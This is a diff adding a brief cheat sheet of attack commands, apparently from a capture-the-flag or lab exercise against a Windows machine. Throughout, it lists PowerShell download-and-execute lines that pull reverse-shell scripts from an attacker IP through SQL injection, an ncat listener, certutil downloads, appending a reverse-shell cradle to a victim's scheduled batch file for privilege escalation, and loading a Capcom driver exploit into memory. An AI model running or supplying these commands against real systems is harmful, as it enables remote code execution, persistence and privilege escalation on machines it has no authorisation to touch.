@@ -1,0 +1,19 @@
+* Cmdline in sql injection
+-- c:\windows\syswow64\windowspowershell\v1.0\powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.13.212/rev.ps1')"
+-- ncat -lvnp 443
+* Setup a SimpleHTTPServer using Python
+-- Python -m SimpleHTTPServer 80
+* Try writing Cmdline which downloads reverse shell from host into victim's automated scripts
+-- echo 'powershell -nop -c "IEX(New-Object Net.WebClient).downloadString(''http://10.10.13.212/rev-445.ps1'')"' >> clean.bat
+* Download a escalate reverse shell from host
+-- certutil -urlcache -split -f http://10.10.13.212/launcher.ps1 c:\users\sqlserv\launch1
+* Cmdline used in UNPREVILIGED powershell
+-- cmd.exe /c "type c:\users\sqlserv\launch1" >> clean.bat
+-- cmd.exe /c "copy c:\users\sqlserv\launch1 c:\users\decoder\clean.bat"
+-- cmd.exe /c "driverquery"
+* Find all files with names ended with ps1
+-- for i in $(find -name *.ps1); do echo $i; done; 
+-- for i in $(find -name *.ps1); do cat $i; echo ""; done > ../../www/capcom.ps1  
+* Download capcom.ps1 from host and capcom.ps1 is automatedly loaded into RAM
+-- IEX(New-Object Net.WebClient).downloadString('http://10.10.13.212/capcom.ps1')
+
